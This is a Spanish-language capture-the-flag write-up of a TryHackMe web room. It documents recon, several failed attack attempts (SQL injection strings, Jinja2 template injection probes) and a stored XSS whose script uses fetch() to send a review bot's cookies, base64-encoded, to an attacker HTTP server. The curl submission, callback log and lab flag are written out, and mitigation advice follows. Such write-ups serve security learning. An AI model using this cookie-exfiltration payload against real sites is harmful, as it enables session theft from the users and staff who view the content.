# Cupids Matchmaker — THM (Web, Easy)

## TL;DR

**Flag:** `THM{XSS_CuP1d_Str1k3s_Ag41n}`

**Vector:** Stored XSS en `/survey`. El "matchmaking team" que revisa cada submission es en realidad un navegador headless que renderiza HTML, no un humano. Pegando `<script>` en los campos de texto, ese navegador ejecuta el JS y exfiltra su `document.cookie` (que contiene `flag=...`) a un HTTP server del atacante.

**Tiempo total:** ~2 min (1 min de setup + ~60 s esperando el callback).

---

## Target

- URL: `http://10.64.164.194:5000`
- Stack: `Werkzeug/3.0.1` + `Python/3.12.3`
- Cookies: Flask `SecureCookieSession` (firmadas, `HttpOnly`, `Path=/`)

## Reconocimiento

Recorrido por fuerza bruta de paths:

| Path               | Resultado                              |
|--------------------|----------------------------------------|
| `/`                | 200 — landing de marketing             |
| `/survey`          | 200 — formulario de personalidad       |
| `/login`           | 200 — admin login                      |
| `/admin`           | 302 → `/login`                         |
| `/admin/submissions`| 302 → `/login` (objetivo final)       |
| `/static/*`        | solo `css/style.css`                   |
| `/robots.txt`, `/.git`, `/.env`, `/api/*`, `/match*` | 404 |

Inspección del form del survey:

- Campos: `name`, `age`, `gender`, `seeking`, `ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`
- POST → 302 a `/` con flash `success: "Thank you! Our matchmaking team will review your submission shortly!"`
- Sin token CSRF, sin sanitización visible en cliente

Login (`/login`):

- Solo `username` y `password`
- POST inválido → 200 con flash `error: "Invalid credentials!"`, `Set-Cookie: session=` (borrado)
- No devuelve traceback ni 500 ante payloads extraños (probado `application/json` → 500, pero no informativo)

Pistas en el propio sitio (decisivas):

- "Our dedicated matchmaking team personally reviews every single submission. No cold algorithms here!"
- "Our team typically reviews submissions within a minute."
- "No Algorithms. No AI. Just Real Human Matchmakers." — ironía: **sí** hay un bot.

Eso encaja con un navegador headless (Puppeteer/Playwright) que abre cada submission y la muestra a alguien, o que la usa como contexto para un LLM y renderiza la preview. En cualquier caso, **el contenido se interpreta como HTML**.

## Vías descartadas (para no repetir)

- **SQLi en `/login`** — `' OR 1=1 --`, `' UNION SELECT ...`, `" OR "1"="1` etc. Todos devuelven "Invalid credentials". Sin 500, sin mensaje distinto → o la query está parametrizada, o el error genérico oculta todo. No hay pista que indique SQL.
- **SSTI Jinja2 en el survey** — `{{7*7}}`, `{{config}}`, payload con `request.application.__globals__`. No se refleja en la respuesta del POST ni en posteriores GET con esa cookie. Conclusión: el texto se guarda tal cual y se renderiza en otro lado, no en este request.
- **Brute force de Flask SECRET_KEY con rockyou** — la cookie de un usuario no autenticado solo contiene `{"_flashes": [...]}`. Falsificar una sesión admin con `user_id=admin` requiere el SECRET. `flask-unsign` tardaba ~1k intentos/s y la cookie tiene un timestamp, así que el espacio útil es enorme. Mataría horas y no era necesario una vez localizado el XSS.
- **Path traversal en `/static/`** — `../app.py`, `..%2fapp.py` → 404. Werkzeug sanea.
- **Endpoints ocultos** — probados `/api/*`, `/match*`, `/chat*`, `/matchmaker/*`, `/admin/{dashboard,matches,users,console,flag}`, todos 404.

## Explotación

### 1. Servidor de captura en el atacante

```
python3 -m http.server 8000 --bind 0.0.0.0
```

IP del atacante: `192.168.134.200` (interfaz `tun0`, alcanzable desde la subred del target `/18`).

### 2. POST al survey con XSS en cada campo de texto

Payload único (mismo en los 5 campos `name`, `ideal_date`, `describe_yourself`, `looking_for`, `dealbreakers`):

```
<script>fetch("http://192.168.134.200:8000/?cookie=" + btoa(document.cookie));</script>
```

```bash
PAYLOAD='<script>fetch("http://192.168.134.200:8000/?cookie=" + btoa(document.cookie));</script>'
curl -s -m 30 -X POST http://10.64.164.194:5000/survey \
  --data-urlencode "name=$PAYLOAD" \
  --data-urlencode "age=25" \
  --data-urlencode "gender=Male" \
  --data-urlencode "seeking=Female" \
  --data-urlencode "ideal_date=$PAYLOAD" \
  --data-urlencode "describe_yourself=$PAYLOAD" \
  --data-urlencode "looking_for=$PAYLOAD" \
  --data-urlencode "dealbreakers=$PAYLOAD"
```

Razón de poner el payload en los 5 campos: el revisor puede renderizar uno, varios o todos. No sabiendo cuál, se cubren todas las opciones con una sola submission.

### 3. Esperar el callback

~60 s después, en el log del servidor:

```
10.64.164.194 - - [29/Jun/2026 14:22:04] "GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1" 200 -
10.64.164.194 - - [29/Jun/2026 14:22:05] "GET /?cookie=... HTTP/1.1" 200 -
...
```

La IP origen es el propio target, así que el callback es del navegador headless del "matchmaker".

### 4. Decodificar

```
$ echo "ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59" | base64 -d
flag=THM{XSS_CuP1d_Str1k3s_Ag41n}
```

## Lecciones

- **El marketing miente.** "No AI", "Real human matchmakers" → en realidad hay un headless browser. Tomar al pie de la letra las descripciones de marketing de un CTF es perder el tiempo.
- **"We read every word"** = "renderizamos cada input sin escapar" = XSS.
- **Stored XSS sigue siendo vigente** en 2026: cualquier campo de texto libre sin sanitización de salida en una vista accesible por otro usuario es una bandera esperando que alguien la robe.

## Mitigación (para el reporte)

- Escapar el contenido por defecto en el template (`{{ value | e }}` en Jinja2, `textContent` en React, etc.).
- Política CSP estricta que prohíba `script-src` externo y restrinja inline.
- Marcar la cookie como `HttpOnly` (ya lo estaba) **y** `Secure` y `SameSite=Strict`. La flag no debería ir en una cookie accesible a JS — debería vivir en un endpoint protegido que requiera autenticación.
- Si se necesita que un bot "vea" submissions humanas, renderizarlas en texto plano o sanitizarlas con una allowlist (Markdown limitado, no HTML crudo).

## Artefactos

- `scripts/xss_exfil.py` — servidor de captura + POST automatizado.
- `content/01_recon.md` — recon raw.
- `exploits/README.md` — resumen corto.